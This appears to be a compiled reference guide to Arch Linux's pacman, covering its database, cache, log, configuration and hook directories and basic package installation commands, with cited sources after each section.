`/var/lib/pacman/` is currently the only directory in `/var` that is treated as a core Arch Linux component. This creates unique challenges for system snapshots, rootfs snapshots, and read-only filesystems. Some users advocate for relocating this directory to `/usr/lib/sysimage` to simplify backup/restore operations and improve consistency with btrfs-based filesystem layouts.[2]

### Database File Symlinks

Database files in `/var/lib/pacman/sync/` often use symlinks for convenience. For example:[3]

```
customrepo.db -> customrepo.db.tar.zst
customrepo.files -> customrepo.files.tar.zst
```


These symlinks provide shorthand references to the actual compressed database files.[3]

### Multi-Architecture Support

When supporting multiple architectures, each architecture should maintain separate directory structures to prevent errors. The database directory structure must account for architecture-specific package storage:[3]

```
customrepo/
└── x86_64/
    ├── customrepo.db -> customrepo.db.tar.zst
    ├── customrepo.db.tar.zst
    ├── customrepo.files -> customrepo.files.tar.zst
    ├── customrepo.files.tar.zst
    └── package-1.0-1-x86_64.pkg.tar.zst
```


### Database Maintenance

Regular database maintenance operations involve:[1]

- Synchronizing with remote repositories
- Verifying database integrity
- Cleaning outdated sync databases
- Rebuilding corrupted databases
- Updating file listings

The health of `/var/lib/pacman/` directly impacts the stability and reliability of the entire package management system.[2]

Sources
[1] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[2] Change the default location of the database directory https://bbs.archlinux.org/viewtopic.php?id=292182
[3] pacman/Tips and tricks - ArchWiki https://wiki.archlinux.org/title/Pacman/Tips_and_tricks
[4] Arch Linux Pacman: A Detailed Guide with Commands and ... https://dev.to/snigdhaos/arch-linux-pacman-a-detailed-guide-with-commands-and-examples-en5
[5] pacman.conf(5) https://pacman.archlinux.page/pacman.conf.5.html
[6] Using pacman to Manage Emscripten Packages https://ignore.pl/2022/06/using_pacman_to_manage_emscripten_packages.html
[7] A pacman repository & package explorer for Arch Linux https://www.reddit.com/r/archlinux/comments/t565za/pacfinder_a_pacman_repository_package_explorer/
[8] Pacman command in Arch Linux https://www.geeksforgeeks.org/linux-unix/pacman-command-in-arch-linux/
[9] Understanding pacman -Syu Command in Arch Linux https://itsfoss.com/pacman-syu/
[10] How to Use Pacman in Arch Linux https://smarttech101.com/how-to-use-pacman-in-arch-linux

## Cache Directory (`/var/cache/pacman/pkg/`)

### Directory Purpose and Location

`/var/cache/pacman/pkg/` is the default location where pacman stores downloaded package files. This directory is defined by the `CacheDir` option in the `[options]` section of `/etc/pacman.conf`. The cache directory serves as a local repository of package files that have been downloaded from remote mirrors.[1][4][6]

### Package File Format

Downloaded packages are stored as `.pkg.tar.zst` files (or other supported compression formats like `.pkg.tar.xz`, `.pkg.tar.gz`). These are complete binary packages ready for installation or reinstallation without requiring network access.[3][4]

### Cache Behavior

Pacman does not remove old or uninstalled package versions automatically. When packages are installed or upgraded, the downloaded files remain in the cache directory indefinitely unless manually cleaned. This means the cache grows continuously over time as packages are installed, updated, and upgraded.[9][1][3]

### Advantages of Caching

#### Downgrading Capability

The cache allows downgrading packages without retrieving previous versions through other means such as the Arch Linux Archive. If a newer package version causes problems, reverting to an older cached version is straightforward.[1]

#### Offline Reinstallation

Packages that have been uninstalled can be easily reinstalled directly from the cache directory without requiring a new download from the repository. This is particularly useful for systems with limited or unreliable network connectivity.[3][1]

#### Recovery and Troubleshooting

The cache provides a safety net for system recovery, allowing reinstallation of specific package versions that were previously working.[1][3]

### Cache Growth Management

The cache directory can grow indefinitely if not managed. It is necessary to deliberately clean up the cache periodically to prevent the directory from growing to unmanageable sizes. Users frequently report cache directories consuming 10-30+ GB of disk space when left unmanaged.[9][3][1]

### Cleaning the Cache

#### Using pacman -Sc

The command `pacman -Sc` removes all cached packages that are not currently installed. This provides a moderate level of cache cleaning while preserving packages for currently installed software.[3]

#### Using pacman -Scc

The command `pacman -Scc` removes all cached files regardless of installation status. This completely empties the cache directory, freeing maximum disk space but removing the ability to downgrade or reinstall without downloading.[3]

**Warning:** This operation prompts for confirmation and will remove all package cache files.[3]

#### Using paccache

The `paccache` script, provided in the `pacman-contrib` package, offers more granular cache management. By default, it deletes all cached versions of installed and uninstalled packages except for the most recent three versions.[1]

**Key features:**
- Preserves multiple recent versions for rollback capability
- Can be configured to retain different numbers of versions
- Handles both installed and uninstalled packages
- Can be automated via systemd timers or cron jobs[7]

**Example usage:**
```
paccache -r
paccache -rk1  # Keep only 1 version
paccache -ruk0 # Remove all uninstalled packages
```


The `-c` switch allows specifying a custom cache directory when using paccache if the location differs from the default.[2]

### Multiple Cache Directories

Multiple cache directories can be specified in `/etc/pacman.conf`, and they are tried in the order listed. If a package file is not found in any cache directory, it will be downloaded to the first cache directory with write access.[6]

**Configuration example:**
```
CacheDir = /var/cache/pacman/pkg/
CacheDir = /mnt/storage/pacman/cache/
```


This configuration allows distributing package cache across multiple filesystems or storage devices.[6]

### Cache Directory Path Configuration

The cache directory location can be overridden in `/etc/pacman.conf` using the `CacheDir` directive:[6]

```
CacheDir = /path/to/cache/dir
```


This is an absolute path, and the root path is not automatically prepended. When changing the cache directory location, the trailing slash must be retained.[2][6][1]

### Relocating the Cache Directory

If relocating the cache directory to a more convenient location, several methods are available:[1]

#### Recommended: CacheDir Configuration

Set the `CacheDir` option in `/etc/pacman.conf` to the new directory path. This is the recommended solution for changing cache location.[1]

#### Mounting Dedicated Storage

Mount a dedicated partition or Btrfs subvolume at `/var/cache/pacman/pkg/`. This approach keeps the default path while using separate storage.[1]

#### Bind Mounting

Bind-mount a selected directory to `/var/cache/pacman/pkg/`. This provides flexibility in storage location while maintaining the standard path.[1]

**Warning:** Do not symlink `/var/cache/pacman/pkg/` to another location. This will cause pacman to misbehave, especially when pacman attempts to update itself.[1]

### Querying Cache Directory Location

The current cache directory can be displayed using:[8]

```
pacman -v
```

This shows comprehensive configuration information including cache directories.[8]

For scripting purposes, the cache directory can be extracted with:[8]

```
pacman -v | grep Cache | awk '{print $3}'
```

Alternatively, when using the default config file location:[8]

```
awk '/Cache/ {print $3}' /etc/pacman.conf
```

### Cache Directory Structure

The cache directory itself is a flat structure containing package files. Package files are named according to the pattern:[4]

```
packagename-version-release-architecture.pkg.tar.compression
```

**Example:**
```
firefox-120.0-1-x86_64.pkg.tar.zst
linux-6.5.9.arch2-1-x86_64.pkg.tar.zst
```

### Download and Copy Behavior

When pacman installs or updates packages, it downloads (or in the case of a local repository, copies) the `.pkg.tar.zst` file to the cache directory. The package is then extracted and installed from this cached copy.[4]

### AUR Helper Caches

AUR helpers such as `yay` and `paru` maintain their own separate cache directories, typically in `~/.cache/yay/` or `~/.cache/paru/`. These caches store both downloaded source files and built packages, and must be cleaned separately from the pacman cache.[7]

### Automation of Cache Cleaning

Cache cleaning can be automated through several mechanisms:[7]

#### Systemd Timers

Create a systemd timer unit to run `paccache` periodically, such as weekly or monthly.[7]

#### Pacman Hooks

Implement pacman hooks that automatically clean the cache after every package operation or after specific triggers.[7]

#### Cron Jobs

Schedule `paccache` execution via cron for regular cleanup on a defined schedule.[7]

### Cache and System Snapshots

The package cache directory is useful for system restore scenarios. When combined with system snapshots, the cache enables rolling back to previous package versions even if repository mirrors no longer host those specific versions.[1]

### Required Directory Structure

When setting up custom pacman environments, the cache directory structure must be created properly:[5]

```
var/
└── cache/
    └── pacman/
        └── pkg/
```


For isolated or chroot environments, the `CacheDir` configuration must point to the correct location within the alternate root.[5]

### Write Access Requirements

Pacman requires write access to at least one configured cache directory. If multiple cache directories are specified, pacman attempts to use each in order until finding one with write permissions. Downloaded packages are saved to the first writable cache directory.[6]

### Impact on Disk Space

The cache directory is frequently one of the largest directories on an Arch Linux system. Users with limited disk space, particularly on root partitions, should implement regular cache cleaning strategies to prevent storage exhaustion.[9][3]

Sources
[1] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[2] [Solved] Replacing package cache directory for pacman / ... https://bbs.archlinux.org/viewtopic.php?id=178652
[3] what is /var/cache/package/pkg and why is it so large? https://www.reddit.com/r/archlinux/comments/1hgbl1k/what_is_varcachepackagepkg_and_why_is_it_so_large/
[4] [Solved] How does pacman cache work? https://bbs.archlinux.org/viewtopic.php?id=270466
[5] Using pacman to Manage Emscripten Packages https://ignore.pl/2022/06/using_pacman_to_manage_emscripten_packages.html
[6] pacman.conf(5) https://pacman.archlinux.page/pacman.conf.5.html
[7] Pacman is BLOATING Up My System! (Cleaning the cache ... https://www.youtube.com/watch?v=wp3LfWwCrZE
[8] How to print the pacman cache directory ... https://bbs.archlinux.org/viewtopic.php?id=112379
[9] Why does pacman always have a huge cache? : r/archlinux https://www.reddit.com/r/archlinux/comments/1myqlss/why_does_pacman_always_have_a_huge_cache/

## Log Files and Locations

### Primary Log File

`/var/log/pacman.log` is the default location of the pacman log file. This file records all package management operations including installations, removals, upgrades, and downgrades. The log file is created and maintained automatically by pacman during every operation.[2][3][5]

### Log File Configuration

The log file location can be overridden in `/etc/pacman.conf` using the `LogFile` directive in the `[options]` section:[5][2]

```
LogFile = /path/to/log/file
```


This is an absolute path, and the root directory is not automatically prepended. If the log file path is not specified on either the command line or in `/etc/pacman.conf`, its default location will be inside the root path specified by `RootDir`.[2][5]

### Log File Contents

The pacman log file records timestamp information for all package operations. Each entry includes:[3]

- Date and time of the operation
- Type of operation (installed, upgraded, removed, downgraded)
- Package name and version
- Transaction details
- Warning and error messages

The log does not typically save detailed package installation messages or output that appears on screen during installation. It focuses on transaction records rather than verbose package-specific information.[3]

### Log File Format

Log entries follow a structured format with timestamps and operation codes. Each line represents a discrete event or transaction in the package management history.[2]

**Example log entries:**
```
[2024-10-15 14:23] [PACMAN] Running 'pacman -Syu'
[2024-10-15 14:24] [ALPM] upgraded linux (6.5.8-1 -> 6.5.9-1)
[2024-10-15 14:25] [ALPM] installed firefox (120.0-1)
```


### Accessing the Log File

The log file can be viewed using standard text viewing tools:[8]

**Direct viewing:**
```
cat /var/log/pacman.log
less /var/log/pacman.log
nano /var/log/pacman.log
vim /var/log/pacman.log
```


**Filtering recent entries:**
```
tail /var/log/pacman.log
tail -n 50 /var/log/pacman.log
```

**Searching for specific operations:**
```
grep installed /var/log/pacman.log
grep upgraded /var/log/pacman.log
```

### File Permissions

Log files in `/var/log` are typically owned by root and may require appropriate permissions to access. Adding your user to the `log` group allows viewing log files without requiring root privileges:[6]

```
sudo usermod -aG log username
```


### Log Directory Structure

The `/var/log/` directory contains various system and application logs:[7][6]

**Common files:**
- `pacman.log` - Pacman package management log[6]
- `Xorg.0.log` - X Window System log[6]
- `Xorg.0.log.old` - Previous X session log[7]
- `btmp` - Failed login attempts[7]
- `lastlog` - Last login information[7]
- `wtmp` - Login/logout history[7]
- `faillog` - Failed login log[7]
- `slim.log` - Slim display manager log (if installed)[7]

**Common subdirectories:**
- `journal/` - systemd journal files[7]
- `cups/` - CUPS printing system logs[7]
- `old/` - Archived or rotated logs[7]

### Journal Integration

Arch Linux uses systemd's journald for most system logging by default. Traditional text-based log files like `kern.log`, `syslog`, and `messages` are not present unless additional logging daemons such as rsyslog or syslog-ng are installed.[7]

System logs can be accessed using `journalctl`:[7]

```
journalctl
journalctl -b
journalctl -xe
journalctl -u servicename
```


### Capturing Installation Output

While `/var/log/pacman.log` records transaction information, it does not capture detailed package installation messages that scroll during operations. To preserve this output, use the `tee` command:[3]

```
pacman -Syu | tee /var/log/pacman/installation.log
```


This approach captures both screen output and saves it to a file simultaneously. Creating a dedicated directory like `/var/log/pacman/` for storing custom installation logs can help organize detailed operation records.[3]

### Log File Use Cases

#### Installation History

The log file provides a complete history of when packages were installed on the system. This is useful for:[2]

- Tracking system changes over time
- Identifying when specific packages were added
- Troubleshooting issues related to recent installations
- Auditing package management activities

#### Rollback Planning

When problems occur after upgrades, the log helps identify which packages were updated and when. This information is crucial for determining which packages to downgrade when troubleshooting system issues.[2]

#### System Documentation

The log serves as a chronological record of system evolution, documenting all package management decisions and changes throughout the system's lifetime.[2]

### Log Analysis

Pacman logs can be analyzed to extract useful information about package management patterns:

**Finding all installations between dates:**
```
awk '/2024-10-01/,/2024-10-31/' /var/log/pacman.log | grep installed
```

**Listing all removed packages:**
```
grep removed /var/log/pacman.log
```

**Finding package-specific history:**
```
grep 'package-name' /var/log/pacman.log
```

### Log Rotation

The pacman log file can grow significantly over time on systems with frequent package operations. Standard log rotation tools like `logrotate` can be configured to manage the log file size by archiving and compressing older entries.

### Complementary Information Sources

While `/var/log/pacman.log` tracks operations, it does not provide a current snapshot of installed packages. For listing currently installed packages, use pacman query commands rather than parsing the log:[8]

```
pacman -Q        # List all installed packages
pacman -Qe       # List explicitly installed packages
pacman -Ql pkg   # List files installed by a package
```


### Required Directory Structure

When setting up custom pacman environments or chroot installations, the log directory structure must be created:[11]

```
var/
└── log/
    └── pacman.log
```


The log file is created automatically by pacman when it performs its first operation if the directory structure exists.[11]

Sources
[1] var/log/pacman.log - GitHub Gist https://gist.github.com/308579beb31624b9339d
[2] [SOLVED] Where to find pacman install log - Arch Linux Forums https://bbs.archlinux.org/viewtopic.php?id=150445
[3] Pacman saves its logs ...where???[SOLVED ... - Arch Linux Forums https://bbs.archlinux.org/viewtopic.php?id=10461
[4] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[5] pacman.conf(5) https://pacman.archlinux.page/pacman.conf.5.html
[6] Viewing pacman install log / Newbie Corner / Arch Linux Forums https://bbs.archlinux.org/viewtopic.php?id=116507
[7] Where are the logs? / Newbie Corner / Arch Linux Forums https://bbs.archlinux.org/viewtopic.php?id=168532
[8] Pacman log : r/archlinux - Reddit https://www.reddit.com/r/archlinux/comments/qa3i4i/pacman_log/
[9] How to find where a package is installed by pacman? - Stack Overflow https://stackoverflow.com/questions/22681578/how-to-find-where-a-package-is-installed-by-pacman
[10] Where does apps are stored on arch with pacman? - Reddit https://www.reddit.com/r/archlinux/comments/1hfgik0/where_does_apps_are_stored_on_arch_with_pacman/
[11] Using pacman to Manage Emscripten Packages https://ignore.pl/2022/06/using_pacman_to_manage_emscripten_packages.html

## Configuration Directories

### Primary Configuration Directory

`/etc/pacman.d/` is the main configuration directory for pacman that contains various configuration files and subdirectories. This directory stores supplementary configuration beyond the primary `/etc/pacman.conf` file.[1][2]

### Directory Naming Convention

The `.d` suffix in `pacman.d` follows a Unix/Linux convention for configuration directories. However, unlike many other programs that automatically read all files within `.d` directories, pacman only reads specific files that are explicitly referenced via `Include` directives in `/etc/pacman.conf`. The directory name `pacman.d` was established during the period when adding `.d` to configuration directory names was becoming a standard practice.[3]

### Standard Files and Subdirectories

#### mirrorlist

`/etc/pacman.d/mirrorlist` contains the list of package repository mirrors. This file is typically included by repository sections in `/etc/pacman.conf` using the `Include` directive:[4][5]

```
[core]
Include = /etc/pacman.d/mirrorlist
```

The mirrorlist file contains `Server` directives with mirror URLs using variable substitution for `$repo` and `$arch`.[6][7]

#### gnupg Directory

`/etc/pacman.d/gnupg/` is the default directory containing GnuPG configuration files used for package signature verification. This location can be overridden using the `GPGDir` directive in `/etc/pacman.conf`:[8][1]

```
GPGDir = /etc/pacman.d/gnupg/
```


**Contents include:**
- `pubring.gpg` - Public keys of package maintainers[1]
- `trustdb.gpg` - Trust database for key validation[1]
- GPG configuration files for signature checking[1]

Before first using pacman, the keyring must be initialized with `pacman-key --init` and populated with official keys using `pacman-key --populate archlinux`.[5]

#### hooks Directory

`/etc/pacman.d/hooks/` is the default directory for user-defined alpm hooks. This location can be overridden or supplemented using the `HookDir` directive in `/etc/pacman.conf`:[6][8][1]

```
HookDir = /etc/pacman.d/hooks/
```


Multiple hook directories can be specified, and pacman searches them in the order listed. User-defined hooks in this directory complement system hooks located in `/usr/share/libalpm/hooks/`.[6][1]

### Configuration Hierarchy

The pacman configuration system follows a hierarchical structure:[9][8]

**Main configuration file:**
- `/etc/pacman.conf` - Primary configuration defining global options and repositories[10][8]

**Supporting directory:**
- `/etc/pacman.d/` - Contains supplementary configuration files[2]

**Repository definitions:**
Repository sections in `/etc/pacman.conf` reference files in `/etc/pacman.d/` through `Include` directives.[4][9]

### Directory Path Overrides

All directory paths used by pacman can be overridden in `/etc/pacman.conf`:[4][8]

**RootDir:** Base directory for all pacman operations (default: `/`)[6][1]

**DBPath:** Database directory (default: `/var/lib/pacman/`)[6][1]

**CacheDir:** Package cache directory (default: `/var/cache/pacman/pkg/`)[6][1]

**GPGDir:** GnuPG directory (default: `/etc/pacman.d/gnupg/`)[4]

**HookDir:** Hook directories (default: `/etc/pacman.d/hooks/`)[6][1]

**LogFile:** Log file location (default: `/var/log/pacman.log`)[4]

### Include Mechanism

The `Include` directive in `/etc/pacman.conf` allows referencing external configuration files. This is primarily used to share mirror lists across multiple repository sections:[4][1]

```
[core]
Include = /etc/pacman.d/mirrorlist

[extra]
Include = /etc/pacman.d/mirrorlist

[multilib]
Include = /etc/pacman.d/mirrorlist
```


Files referenced by `Include` directives are typically stored in `/etc/pacman.d/` for organizational consistency.[4]

### Custom Repository Files

Custom or unofficial repository definitions can be stored as separate files in `/etc/pacman.d/` and included in `/etc/pacman.conf`. This keeps custom configurations organized and separate from the main configuration file.[9]

**Example:**
Create `/etc/pacman.d/custom-repo` with repository definitions, then reference it:
```
Include = /etc/pacman.d/custom-repo
```


### Directory Structure for Alternative Installations

When using pacman for chroot installations or managing alternative system roots, the configuration directory structure must be replicated within the target root:[11][12]

```
/mnt/targetroot/
└── etc/
    ├── pacman.conf
    └── pacman.d/
        ├── mirrorlist
        ├── gnupg/
        └── hooks/
```

The `--root` or `--sysroot` options control which root directory pacman operates on, and configuration files are expected within that root.[12]

### Testing Repositories

The `/etc/pacman.d/mirrorlist` file also contains mirrors for testing repositories (`[testing]` and `[multilib-testing]`) which are commented out by default. These testing repositories can be enabled by uncommenting their sections in `/etc/pacman.conf` and rely on the same mirrorlist file.[8]

### Viewing Configuration Paths

Pacman can display all active paths including configuration directories using the verbose flag:[12]

```
pacman -v
```


This shows:
- Root directory
- Configuration file location
- Database path
- Cache directories
- GPG directory
- Hook directories

### Configuration File Restoration

If `/etc/pacman.conf` is accidentally modified or deleted, it can be restored from the pacman package. The default configuration is maintained in the pacman package archive and can be extracted or downloaded from the Arch Linux Git repository.[10]

**Recovery command:**
```
pacman -S pacman --overwrite /etc/pacman.conf
```


Alternatively, download the default configuration directly:
```
curl https://gitlab.archlinux.org/archlinux/packaging/packages/pacman/-/raw/main/pacman.conf -o /etc/pacman.conf
```


### Directory Permissions

Configuration directories and files typically require root ownership and appropriate permissions:[10]

- `/etc/pacman.conf` - Owned by root, readable by all
- `/etc/pacman.d/` - Directory owned by root
- `/etc/pacman.d/gnupg/` - Restricted permissions for security
- `/etc/pacman.d/hooks/` - Owned by root, hooks must be properly formatted

### Required Structure for Custom Environments

When setting up isolated or custom pacman environments, the following directory structure is required:[11]

```
/custom/root/
├── etc/
│   ├── pacman.conf
│   └── pacman.d/
│       ├── mirrorlist
│       ├── gnupg/
│       └── hooks/
├── var/
│   ├── lib/
│   │   └── pacman/
│   │       ├── sync/
│   │       └── local/
│   ├── cache/
│   │   └── pacman/
│   │       └── pkg/
│   └── log/
│       └── pacman.log
```


This complete structure ensures pacman can function correctly in non-standard environments.

Sources
[1] pacman.conf(5) https://pacman.archlinux.page/pacman.conf.5.html
[2] Change the default location of the database directory https://bbs.archlinux.org/viewtopic.php?id=292182
[3] why pacman uses .d so weirdly? https://bbs.archlinux.org/viewtopic.php?id=306113
[4] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[5] [SOLVED]/etc/pacman.conf and /etc/pacman.d/mirrorlist ... https://bbs.archlinux.org/viewtopic.php?id=278448
[6] Installing Pacman in Arch Linux — When You Blow it Up https://blog.stackademic.com/installing-pacman-in-arch-linux-when-you-blow-it-up-aa40778aa237
[7] How to Use Pacman in Arch Linux https://www.atlantic.net/dedicated-server-hosting/how-to-use-pacman-in-arch-linux/
[8] How to Use Pacman in Arch Linux https://smarttech101.com/how-to-use-pacman-in-arch-linux
[9] How to add new software sources using Pacman? https://www.tencentcloud.com/techpedia/102261
[10] Mistakenly cleared all lines in /etc/pacman.conf what ... https://www.reddit.com/r/archlinux/comments/18yzo6l/mistakenly_cleared_all_lines_in_etcpacmanconf/
[11] Using pacman to Manage Emscripten Packages https://ignore.pl/2022/06/using_pacman_to_manage_emscripten_packages.html
[12] pacman(8) https://pacman.archlinux.page/pacman.8.html
[13] pacman/Tips and tricks - ArchWiki https://wiki.archlinux.org/title/Pacman/Tips_and_tricks

## Hook Directories

### Overview

Pacman supports a hooks system that allows automated execution of commands before or after package transactions. Hooks provide the ability to run custom scripts during package installations, upgrades, and removals based on specific triggers.[1][5]

### System Hook Directory

`/usr/share/libalpm/hooks/` is the system hook directory where default alpm hooks provided by packages reside. This directory contains hooks installed by system packages and should not be modified by users.[4][5][6][1]

System hooks are maintained by package maintainers and are automatically installed when packages requiring hook functionality are added to the system. These hooks handle standard system operations like rebuilding the initramfs after kernel updates.[3][6]

### User Hook Directory

`/etc/pacman.d/hooks/` is the default directory for user-created custom hooks. This is where administrators should place their own hooks to extend pacman functionality.[5][6][3][4]

This directory must be created manually as it does not exist by default:[6][7]

```
sudo mkdir -p /etc/pacman.d/hooks
```


### HookDir Configuration

Additional hook directories can be specified using the `HookDir` directive in `/etc/pacman.conf`:[11][1][4]

```
HookDir = /path/to/hook/dir
```


Multiple hook directories can be specified, and hooks in later directories take precedence over hooks in earlier directories. The paths are absolute and the root path is not automatically prepended.[4]

**Example configuration:**
```
HookDir = /etc/pacman.d/hooks
HookDir = /usr/local/share/libalpm/hooks
```


### Hook Search Order

Pacman searches for hooks in the following locations:[10][5]

1. System hook directory: `/usr/share/libalpm/hooks/`[5][10]
2. Default user hook directory: `/etc/pacman.d/hooks/`[5][4]
3. Additional directories specified by `HookDir` directives (in order)[4]

Hooks are executed in alphabetical order of their file names, with the ordering ignoring the `.hook` suffix. Hooks prefixed with lower numbers have precedence over those with higher numbers.[6][5]

### Hook File Requirements

Hook files must have the `.hook` suffix to be recognized by pacman. Without this extension, files are ignored even if placed in valid hook directories.[7][6][5]

**Naming convention:**
```
00-example.hook
50-pacman-list.hook
90-mkinitcpio-install.hook
```


The numeric prefix controls execution order, with lower numbers running first.[6]

### Hook Directory Structure

A typical hook directory structure includes:[6]

```
/etc/pacman.d/
├── hooks/
│   ├── 00-backup-boot.hook
│   ├── 50-pacman-list.hook
│   └── 99-flatpak-update.hook
└── hooks.bin/
    └── custom-script.sh
```


While not required, some users create `/etc/pacman.d/hooks.bin/` to store associated scripts called by hooks, keeping the hook directory organized.[6]

### Hook File Format

Hook files follow an INI-style format with two main sections:[5]

#### [Trigger] Section

Defines when the hook should be executed:[5]

**Operation:** Install, Upgrade, or Remove (required, repeatable)[5][6]

**Type:** Path or Package (required)[5][6]

**Target:** Path or package name to monitor (required, repeatable)[6][5]

#### [Action] Section

Defines what the hook executes:[5]

**Description:** Human-readable description (optional)[6][5]

**When:** PreTransaction or PostTransaction (required)[5][6]

**Exec:** Command to execute (required)[6][5]

**Depends:** Package dependencies (optional)[5]

**AbortOnFail:** Stop transaction if hook fails (optional, PreTransaction only)[5]

**NeedsTargets:** Pass target list to command (optional)[5]

### Hook Examples

#### Package List Backup Hook

```
# /etc/pacman.d/hooks/50-pacman-list.hook
[Trigger]
Type = Package
Operation = Install
Operation = Upgrade
Operation = Remove
Target = *

[Action]
Description = Create a backup list of all installed packages
When = PreTransaction
Exec = /bin/sh -c 'pacman -Qqen > /home/$USER/.cache/package_lists/$(date +%Y-%m-%d_%H:%M)_native.log'
```


#### Flatpak Update Hook

```
# /etc/pacman.d/hooks/99-flatpak-update.hook
[Trigger]
Type = Package
Operation = Install
Operation = Upgrade
Target = *

[Action]
Description = Update Flatpak packages
When = PostTransaction
Exec = /usr/bin/flatpak update
```


#### Boot Partition Backup Hook

```
# /etc/pacman.d/hooks/00-backup-boot.hook
[Trigger]
Operation = Upgrade
Type = Path
Target = boot/*

[Action]
Description = Backing up /boot partition
When = PreTransaction
Exec = /usr/bin/rsync -a /boot /backup/
```


### Trigger Types

#### Package Triggers

Monitor package operations using `Type = Package`. The `Target` specifies package names, with `*` matching all packages.[6][5]

**Example:**
```
[Trigger]
Type = Package
Target = linux
Target = linux-lts
```


#### Path Triggers

Monitor filesystem paths using `Type = Path`. The `Target` specifies file paths relative to the installation root.[6][5]

**Example:**
```
[Trigger]
Type = Path
Target = usr/lib/modules/*/vmlinuz
Target = boot/*
```


Path triggers use glob patterns and execute when matching files are installed, upgraded, or removed.[5]

### Hook Execution Timing

#### PreTransaction Hooks

Execute before packages are installed, upgraded, or removed. These hooks can abort the transaction if they fail (when `AbortOnFail` is set).[6][5]

PreTransaction hooks are useful for creating backups or validating system state before changes occur.[6]

#### PostTransaction Hooks

Execute after packages are installed, upgraded, or removed. These hooks cannot abort the transaction as changes have already been committed.[5][6]

PostTransaction hooks are useful for rebuilding caches, updating databases, or triggering system reconfigurations.[6]

### Hook Precedence

When multiple hook directories are configured, hooks in later directories take precedence over hooks in earlier directories. If two hooks have the same filename, only the hook from the directory with highest precedence is executed.[4]

This allows users to override system hooks by placing identically-named hooks in custom directories.[4]

### Standard System Hooks

Common system hooks found in `/usr/share/libalpm/hooks/` include:[3]

**90-mkinitcpio-install.hook:** Rebuilds initramfs after kernel updates[3]

**systemd-update.hook:** Updates systemd-related configurations[5]

**update-desktop-database.hook:** Refreshes desktop file caches[5]

**gtk-update-icon-cache.hook:** Updates icon caches for GTK applications[5]

### Hook Resources

Third-party hook collections provide examples and ready-to-use hooks for common tasks:[2][9]

- Package list backups[6]
- Broken package detection[9]
- Filesystem snapshots[6]
- Configuration file backups[2]
- Orphaned package cleanup[9]
- System service restarts[6]

### Debugging Hooks

Pacman displays hook execution in its output, showing the description and timing of each hook. If a hook fails, error messages appear in the pacman output, allowing identification of problematic hooks.[7][5]

To test hook execution without performing actual package operations, use `pacman -S --print` to simulate installations.[5]

### Hook Validation

Hook syntax can be validated by checking the pacman output during operations. Malformed hooks are reported as errors and skipped during execution.[5]

The `alpm-hooks(5)` manual page provides comprehensive documentation on hook file format and options.[5]

### Security Considerations

Hooks execute with root privileges during pacman operations. Only trusted scripts should be placed in hook directories, and hook files should have appropriate permissions to prevent unauthorized modification.[6][5]

User-created hooks in `/etc/pacman.d/hooks/` should be reviewed carefully before use to ensure they perform intended actions safely.[6]

Sources
[1] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[2] Hear ye Archers - share your Pacman hooks : r/archlinux https://www.reddit.com/r/archlinux/comments/dsnu81/hear_ye_archers_share_your_pacman_hooks/
[3] [SOLVED] Making a pacman hook to backup /boot ... https://bbs.archlinux.org/viewtopic.php?id=289248
[4] pacman.conf(5) https://pacman.archlinux.page/pacman.conf.5.html
[5] alpm-hooks(5) - Arch manual pages https://man.archlinux.org/man/alpm-hooks.5.en
[6] [HowTo] Create useful Pacman hooks https://forum.manjaro.org/t/howto-create-useful-pacman-hooks/55020
[7] Arch Linux pacman hooks https://www.youtube.com/watch?v=J8EhTmBX6nc
[8] pacman/Tips and tricks - ArchWiki https://wiki.archlinux.org/title/Pacman/Tips_and_tricks
[9] desbma/pacman-hooks: Arch Linux ... https://github.com/desbma/pacman-hooks
[10] Pacman - Stéphane's cheat sheets https://cheatsheets.stephane.plus/distros/arch-based/pacman/
[11] pacman(8) https://pacman.archlinux.page/pacman.8.html


# Installation and Removal

## Installing Packages from Repositories

### Basic Installation Command

To install a single package or list of packages, including dependencies, use the `-S` (sync) option:[1]

```
pacman -S package_name1 package_name2
```


This command downloads the specified packages from configured repositories and installs them along with all required dependencies automatically.[1]

### Installing Single Packages

The most common installation command follows this syntax:[1]

```
pacman -S package_name
```

Pacman resolves all dependencies, downloads necessary files to the cache directory, and installs the package and its dependencies in one operation.[2][1]

### Installing Multiple Packages

Multiple packages can be installed simultaneously by listing them after the `-S` flag:[1]

```
pacman -S firefox vim git
```


This installs all specified packages and their dependencies in a single transaction.[1]

### Repository-Specific Installation

Sometimes multiple versions of a package exist in different repositories (e.g., `extra` and `extra-testing`). To install a specific version from a particular repository, prefix the package name with the repository name:[1]

```
pacman -S extra/package_name
```


This explicitly instructs pacman to use the version from the specified repository, overriding repository precedence defined in `/etc/pacman.conf`.[1]

### Pattern-Based Installation

#### Brace Expansion

Packages sharing similar naming patterns can be installed using curly brace expansion:[1]

```
pacman -S plasma-{desktop,mediacenter,nm}
```


This expands to:
```
pacman -S plasma-desktop plasma-mediacenter plasma-nm
```

Brace expansion can be nested to multiple levels:[1]

```
pacman -S plasma-{workspace{,-wallpapers},pa}
```


This expands to:
```
pacman -S plasma-workspace plasma-workspace-wallpapers plasma-pa
```

#### Regular Expression Installation

Install packages matching a regular expression pattern using command substitution with `pacman -Ssq`:[1]

```
pacman -S $(pacman -Ssq package_regex)
```


The `-Ssq` flag searches repositories quietly, returning only package names that match the pattern, which are then passed to the install command.[1]

### Installing Package Groups

Some packages belong to groups that can be installed simultaneously. When installing a group, pacman presents a numbered list of all packages in the group and allows selection of specific packages or all packages.[1]

**Installing entire group:**
```
pacman -S gnome
```


**Interactive selection:**
After running the command, pacman displays all group members with numbers and prompts for selection. Pressing Enter without input installs all packages in the group.[1]

**Selecting specific packages from group:**
Enter the numbers of desired packages separated by spaces:
```
Enter a selection (default=all): 1 3 5-8
```

**Installing entire group non-interactively:**
```
pacman -S --needed gnome
```

The `--needed` flag skips packages that are already installed, streamlining group installations.[1]

### Virtual Packages

A virtual package is a special package that does not exist by itself but is provided by one or more other packages. Virtual packages cannot be installed by their name; instead, they become installed when you install a package providing the virtual package.[1]

When multiple packages provide the same virtual package, pacman presents a selection menu sorted first by repository order from `pacman.conf`, then alphabetically within each repository.[1]

**Example:**
```
pacman -S dbus-units
```

If multiple packages provide `dbus-units`, pacman prompts for selection.[1]

### Installation Options and Flags

#### --needed Flag

Skip reinstalling packages that are already up-to-date:[3][4]

```
pacman -S --needed package_name
```


